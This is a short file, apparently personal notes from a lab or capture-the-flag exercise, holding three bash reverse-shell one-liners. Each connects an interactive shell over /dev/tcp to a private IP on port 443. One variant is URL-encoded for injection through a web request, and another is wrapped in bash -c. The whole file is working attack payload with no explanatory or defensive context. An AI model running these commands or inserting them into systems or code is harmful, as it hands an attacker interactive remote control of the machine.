bash -i >& /dev/tcp/10.10.14.237/443 0>&1"
"bash -i >%26 /dev/tcp/192.168.1.39/443 0>%261"

bash -c 'exec bash -i >& /dev/tcp/10.10.14.237/443 0>&1'